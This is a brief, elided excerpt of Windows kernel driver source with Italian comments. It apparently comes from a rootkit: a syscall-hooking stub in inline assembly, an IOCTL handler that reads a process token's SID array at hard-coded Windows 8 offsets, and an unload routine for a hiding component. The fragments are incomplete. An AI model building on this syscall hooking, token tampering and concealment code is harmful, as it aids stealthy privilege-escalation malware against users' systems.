...
NTSTATUS Jumper_Function()
{
	...
	/*if (sys_call_index >= pData->sys_call_count){
		__asm POPA
		__asm MOV EAX, 0x80000000 // XXX Metto un errore
		__asm leave
		__asm ret // XXX RETN ???
	}*/
...
NTSTATUS do_ioctl_admin(IN PDEVICE_OBJECT dobj, IN PIRP Irp, IN PIO_STACK_LOCATION irpSp)
{
	...
	if (irpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(BYTE *) ) {
		...
		if (!CheckSIEPointer(sid_array)) {
			// Offser per Windows8
			sid_count = *((DWORD *)(token + 0xCC));
			sid_array = *((SIE **)(token + 0xD0));
			if (!CheckSIEPointer(sid_array))
				return STATUS_SUCCESS;
		}
...
void OnUnloadHiding(IN PDRIVER_OBJECT dobj)
{
	...
	//ExFreePoolWithTag(jumper_entry->global_pid_array, 'agal');
	//ExFreePoolWithTag(jumper_entry->global_func_array, 'agak');
	//ExFreePoolWithTag(jumper_entry, 'agam');
}